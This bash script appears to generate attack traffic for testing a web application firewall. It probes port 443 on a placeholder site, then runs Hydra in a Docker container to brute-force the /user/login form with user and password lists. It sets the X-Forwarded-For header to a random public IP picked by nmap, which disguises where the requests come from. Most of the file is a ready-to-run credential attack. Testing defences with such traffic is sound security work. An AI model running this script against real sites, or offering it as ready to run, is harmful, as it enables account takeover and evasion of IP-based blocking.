#!/bin/bash
# Uncomment set command below for code debuging bash
# set -x

already=$(ps -ef | grep "$0" | grep bash | grep -v grep | wc -l)
if [  $already -gt 2 ]; then
    echo "The script is already running `expr $already - 2` time."
    exit 1
fi

sitefqdn[1]="site40.example.com"

# get length of the array
arraylength=${#sitefqdn[@]}

for (( i=1; i<${arraylength}+1; i++ ));
do
         if [ ! -z "${sitefqdn[$i]}" ]; then
        # Only generat traffic on alive VIP
        ip=$(ping -c 1 -w 1 ${sitefqdn[$i]} | grep PING | awk '{ print $3 }')
        timeout 1 bash -c "cat < /dev/null > /dev/tcp/${ip:1:-1}/443"

        if [  $? == 0 ]; then
            # Port 443 open
            port=443
        else
            # If 443 not anwser, stop
            port=0
        fi

        if [[  $port == 443 ]]; then
            echo -e "\n# site $i ${sitefqdn[$i]} brute force attack"

            nmapcmd=$(which nmap)
            dockercmd=$(which docker)

            xff=$($nmapcmd -n -iR 1 --exclude 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,224-255.-.-.- -sL | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*")
            sudo $dockercmd exec -i asm-brute-force /usr/bin/hydra -V -S -w 5 -T 50 -L /hydra/users10.txt -P /hydra/pass100.txt ${ip:1:-1} https-form-post "/user/login:username=^USER^&password=^PASS^:S=Account:H=X-forwarded-for: $xff"
        fi
    fi
done
